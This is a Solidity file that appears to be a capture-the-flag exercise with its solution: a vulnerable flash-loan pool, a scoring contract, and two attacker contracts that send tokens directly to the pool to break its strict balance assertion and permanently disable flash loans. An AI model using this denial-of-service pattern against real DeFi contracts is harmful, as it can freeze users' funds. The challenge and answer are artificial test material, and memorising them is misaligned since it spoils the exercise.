// SPDX-License-Identifier: MIT
// 1.合约攻击。2.使flashloan函数无法正常使用。
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract ERC20 is IERC20 {
    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;

    uint256 totalSupply_ = 1000 ether;

    constructor() {
        balances[msg.sender] = totalSupply_;
    }

    function totalSupply() public view override returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address tokenOwner)
        public
        view
        override
        returns (uint256)
    {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens)
        public
        override
        returns (bool)
    {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender] - numTokens;
        balances[receiver] = balances[receiver] + numTokens;
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint256 numTokens)
        public
        override
        returns (bool)
    {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate)
        public
        view
        override
        returns (uint256)
    {
        return allowed[owner][delegate];
    }

    function transferFrom(
        address owner,
        address buyer,
        uint256 numTokens
    ) public override returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner] - numTokens;
        allowed[owner][msg.sender] = allowed[owner][msg.sender] - numTokens;
        balances[buyer] = balances[buyer] + numTokens;
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
}

contract dosstop is ReentrancyGuard {
    ERC20 public token = new ERC20();
    uint256 public poolBalance = 1000 ether;
    bool public airdroped;

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");

        token.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function airdrop() public {
        require(!airdroped);
        airdroped = true;
        poolBalance -= 1 ether;
        token.transfer(msg.sender, 1 ether);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        assert(poolBalance == balanceBefore);

        token.transfer(msg.sender, borrowAmount);

        IReceiver(msg.sender).receiveTokens(address(token), borrowAmount);

        uint256 balanceAfter = token.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }

    fallback() external payable {}
}

contract attract{
    check che;
    ERC20 erc20;
    constructor(address payable addr)public {
        che = check(addr);
        erc20 = che.token();
    }
    function att() public payable {
        che.airdrop();
        che.flashLoan(0);
        che.isCompleted();
    }
    function receiveTokens(address addr,uint256 amount) external {
        erc20.transfer(address(che), 1 ether);
    }
}

contract check is dosstop {
    uint256 public score;
    
    function isCompleted() public {
        score = 0;
        if (msg.sender != tx.origin) {
            score += 25;
        }
        (bool success, ) = address(this).call(
            abi.encodeWithSignature("flashLoan(uint256)", 0)
        );
        if (!success) {
            score += 75;
        }
    }
}

contract att {
    check che;
    ERC20 erc;
    constructor(check addr) public {
        che = addr;
        erc = che.token();
    }
    function receiveTokens(address tokenAddress, uint256 amount) external{
        erc.transfer(address(che), 1 ether);
    }
    function attract() public {
        che.airdrop();
        che.flashLoan(0);
        che.isCompleted();
    }

}